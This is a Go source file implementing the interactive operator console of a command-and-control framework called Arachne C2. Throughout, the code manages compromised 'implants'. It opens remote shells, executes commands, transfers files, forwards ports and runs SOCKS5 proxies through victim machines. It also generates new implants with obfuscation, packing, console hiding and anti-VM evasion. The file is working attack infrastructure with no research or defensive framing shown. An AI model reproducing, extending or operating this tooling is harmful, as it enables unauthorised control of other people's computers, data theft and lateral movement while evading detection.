package core

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/peterh/liner"
)

var commandHelp = map[string]string{
	"list":     "list — show registered implants",
	"select":   "select <idx> — select implant by index",
	"ps":       "ps — list processes on selected implant",
	"ls":       "ls [path] — list directory (default: .)",
	"cd":       "cd [path] — change directory (default: .)",
	"pwd":      "pwd — print working directory",
	"shell":    "shell — interactive shell on selected implant (direct libp2p stream)",
	"portfwd":  "portfwd <local-port> <target-host:target-port> — forward local port through implant",
	"exec":     "exec <command> [args...] — execute command on selected implant",
	"download": "download <remote-path> — download file from implant",
	"upload":   "upload <local-path> <remote-path> — upload file to implant",
	"generate":   "generate [flags] — build an implant (all flags optional)\n  --os <string>      target OS: linux, darwin, windows (default: linux)\n  --arch <string>    target arch: amd64, arm64 (default: amd64)\n  --output <path>    output path (default: ./implant)\n  --pubkey <path>    operator public key (default: ~/.arachne/operator.pub)\n  --upx              enable UPX compression (default: true)\n  --obfuscate        obfuscate the binary with garble (auto-installs if missing)\n  --quiet            suppress output, detach from terminal, hide console on Windows\n  --antivm           enable VM detection (pure Go, 65+ techniques, VMAware scoring)",
	"regenerate": "regenerate — regenerate operator keypair (old implants will not call back)",
	"socks":     "socks start|list|stop — manage SOCKS5 proxies (use 'socks help' for details)",
	"help":      "help [command] — show this help or help for a specific command",
	"exit":      "exit — quit the console",
}

func checkHelp(args []string) bool {
	for _, a := range args {
		if a == "--help" || a == "-h" {
			return true
		}
	}
	return false
}

func (o *Operator) RunCLI() {
	os.MkdirAll(arachneDir(), 0700)

	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)

	histPath := filepath.Join(arachneDir(), "history")
	if f, err := os.Open(histPath); err == nil {
		line.ReadHistory(f)
		f.Close()
	}
	defer saveHistory(histPath, line)

	var selected *ImplantRecord

	fmt.Println("Arachne C2 — interactive console")
	fmt.Println("Type 'help' for commands, 'help <command>' for details.")
	fmt.Println()

	for {
		if selected != nil && selected.Disconnected {
			fmt.Printf("implant %s@%s disconnected — returning to main prompt\n", selected.Name, selected.Hostname)
			selected = nil
		}

		prompt := "arachne> "
		if selected != nil {
			prompt = fmt.Sprintf("arachne[%s@%s]> ", selected.Name, selected.Hostname)
		}

		input, err := line.Prompt(prompt)
		if err != nil {
			if err == liner.ErrPromptAborted {
				continue
			}
			break
		}
		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		line.AppendHistory(input)

		parts := strings.Fields(input)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			return

		case "help":
			if len(args) > 0 {
				if h, ok := commandHelp[args[0]]; ok {
					fmt.Println("  " + h)
				} else {
					fmt.Printf("no help for '%s'\n", args[0])
				}
				continue
			}
			fmt.Println("Commands:")
			for _, name := range []string{"list", "select", "ps", "ls", "cd", "pwd", "shell", "portfwd", "socks", "exec", "download", "upload", "generate", "regenerate", "help", "exit"} {
				line := commandHelp[name]
				if i := strings.IndexByte(line, '\n'); i >= 0 {
					line = line[:i]
				}
				fmt.Println("  " + line)
			}
			fmt.Println("Use 'help <command>' for details and flags.")

		case "list":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["list"])
				continue
			}
			implants := o.ListImplants()
			active := 0
			for _, rec := range implants {
				if rec.Disconnected {
					continue
				}
				ago := time.Since(rec.LastCheckin).Round(time.Second)
				fmt.Printf("  %d: %s@%s [%s/%s] last=%s peer=%s\n",
					active, rec.Name, rec.Hostname, rec.OS, rec.Arch, ago, shortenStr(rec.PeerID, 20))
				active++
			}
			if active == 0 {
				fmt.Println("no connected implants")
			}

		case "select":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["select"])
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: select <idx>")
				continue
			}
			idx, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("bad index: %v\n", err)
				continue
			}
			implants := o.ListImplants()
			// Filter to only connected implants for indexing
			var connected []*ImplantRecord
			for _, rec := range implants {
				if !rec.Disconnected {
					connected = append(connected, rec)
				}
			}
			if idx < 0 || idx >= len(connected) {
				fmt.Println("index out of range")
				continue
			}
			selected = connected[idx]
			fmt.Printf("selected %s@%s (%s)\n", selected.Name, selected.Hostname, selected.PeerID)

		case "ps":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["ps"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Ps(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "ls":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["ls"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Ls(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "cd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["cd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			path := "."
			if len(args) > 0 {
				path = args[0]
			}
			if err := o.Cd(selected.PeerID, path); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "pwd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["pwd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if err := o.Pwd(selected.PeerID); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "shell":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["shell"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			fmt.Printf("opening shell to %s@%s...\n", selected.Name, selected.Hostname)
			if err := o.OpenShell(selected.PeerID); err != nil {
				fmt.Printf("shell error: %v\n", err)
			}

		case "portfwd":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["portfwd"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) < 2 {
				fmt.Println("usage: portfwd <local-port> <target-host:target-port>")
				continue
			}
			localPort, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("bad port: %v\n", err)
				continue
			}
			if err := o.Portfwd(selected.PeerID, localPort, args[1]); err != nil {
				fmt.Printf("portfwd error: %v\n", err)
			}

		case "socks":
			if len(args) == 0 || args[0] == "help" || checkHelp(args) {
				fmt.Println("  socks <subcommand> [args]")
				fmt.Println("  subcommands:")
				fmt.Println("    start <idx|random> <port>  — start SOCKS5 proxy (uses saved credentials if available)")
				fmt.Println("    list                       — show running SOCKS5 proxies")
				fmt.Println("    stop <port>                — stop a running SOCKS5 proxy")
				fmt.Println("    reset-creds                — clear saved credentials (re-prompt on next start)")
				continue
			}

			switch args[0] {
			case "start":
				if len(args) < 2 {
					fmt.Println("usage: socks start <idx|random> <port>")
					continue
				}
				idArg := args[1]
				port := 1080
				if len(args) > 2 {
					if p, err := strconv.Atoi(args[2]); err == nil && p > 0 && p <= 65535 {
						port = p
					} else {
						fmt.Printf("bad port: %s\n", args[2])
						continue
					}
				}

				creds, _ := LoadSocksCreds()
				var username, password string
				if creds != nil {
					username = creds.Username
					fmt.Printf("using saved credentials (user: %s)\n", username)
					pass, err := line.Prompt("SOCKS password: ")
					if err != nil {
						continue
					}
					if !checkPassword(pass, creds.PasswordHash) {
						fmt.Println("incorrect password")
						continue
					}
					password = pass
				} else {
					u, err := line.Prompt("SOCKS username: ")
					if err != nil {
						continue
					}
					p, err := line.Prompt("SOCKS password: ")
					if err != nil {
						continue
					}
					username = u
					password = p
					hash, err := hashPassword(password)
					if err != nil {
						fmt.Printf("failed to hash password: %v\n", err)
						continue
					}
					if err := SaveSocksCreds(&SocksCreds{Username: username, PasswordHash: hash}); err != nil {
						fmt.Printf("failed to save socks creds: %v\n", err)
						continue
					}
				}

				targetID := idArg
				if idArg != "random" {
					peerID, rec, err := o.pickImplantPeerID(idArg)
					if err != nil {
						fmt.Printf("socks: %v\n", err)
						continue
					}
					targetID = peerID
					fmt.Printf("using implant %s@%s\n", rec.Name, rec.Hostname)
				}
				fmt.Printf("starting SOCKS5 proxy on 127.0.0.1:%d...\n", port)
				if err := o.SocksStart(targetID, port, username, password); err != nil {
					fmt.Printf("socks start error: %v\n", err)
				}

			case "list":
				proxies := o.SocksList()
				if len(proxies) == 0 {
					fmt.Println("no SOCKS5 proxies running")
				} else {
					fmt.Println("SOCKS5 proxies:")
					for _, p := range proxies {
						uptime := time.Since(p.StartTime).Round(time.Second)
						fmt.Printf("  %d: %s -> implant %s (up %s)\n", p.Port, p.Username, p.ImplantID, uptime)
					}
				}

			case "stop":
				if len(args) < 2 {
					fmt.Println("usage: socks stop <port>")
					continue
				}
				port, err := strconv.Atoi(args[1])
				if err != nil || port < 1 || port > 65535 {
					fmt.Printf("bad port: %s\n", args[1])
					continue
				}
				if err := o.SocksStop(port); err != nil {
					fmt.Printf("socks stop error: %v\n", err)
				} else {
					fmt.Printf("SOCKS5 proxy on port %d stopped\n", port)
				}

			case "reset-creds":
				if err := ClearSocksCreds(); err != nil {
					fmt.Printf("reset-creds error: %v\n", err)
				} else {
					fmt.Println("SOCKS credentials cleared")
				}

			default:
				fmt.Printf("unknown socks subcommand: %s (try 'socks help')\n", args[0])
			}

		case "download":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["download"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: download <path>")
				continue
			}
			if err := o.Download(selected.PeerID, args[0]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("download command sent")
			}

		case "upload":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["upload"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) < 2 {
				fmt.Println("usage: upload <src> <dst>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("read %s: %v\n", args[0], err)
				continue
			}
			if err := o.Upload(selected.PeerID, args[1], data); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("upload command sent")
			}

		case "exec", "execute":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["exec"])
				continue
			}
			if selected == nil {
				fmt.Println("no implant selected (use 'select <idx>')")
				continue
			}
			if len(args) == 0 {
				fmt.Println("usage: exec <cmd> [args...]")
				continue
			}
			if err := o.Execute(selected.PeerID, args[0], args[1:]); err != nil {
				fmt.Printf("error: %v\n", err)
			} else {
				fmt.Println("command sent")
			}

		case "generate":
			if checkHelp(args) {
				fmt.Println("  " + commandHelp["generate"])
				continue
			}
			if err := RunGenerate(args); err != nil {
				fmt.Printf("generate error: %v\n", err)
			}

		case "regenerate":
			fmt.Println("WARNING: regenerating operator keys will invalidate ALL existing implants.")
			fmt.Println("Old implants have your current public key embedded and will NOT be able to call back.")
			ans, err := line.Prompt("Are you sure? [y/N] ")
			if err != nil || (ans != "y" && ans != "Y" && ans != "yes") {
				fmt.Println("cancelled")
				continue
			}
			keyPath := keyPath()
			pubPath := pubKeyPath()
			os.Remove(keyPath)
			os.Remove(pubPath)
			log.Printf("deleted %s and %s", keyPath, pubPath)
			log.Printf("regenerated keys will take effect on next startup")
			fmt.Println("Restart arachne for the new keys to take effect.")

		default:
			fmt.Printf("unknown command: %s (try 'help')\n", cmd)
		}
	}
}

func saveHistory(path string, line *liner.State) {
	if f, err := os.Create(path); err == nil {
		line.WriteHistory(f)
		f.Close()
	}
}

func shortenStr(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
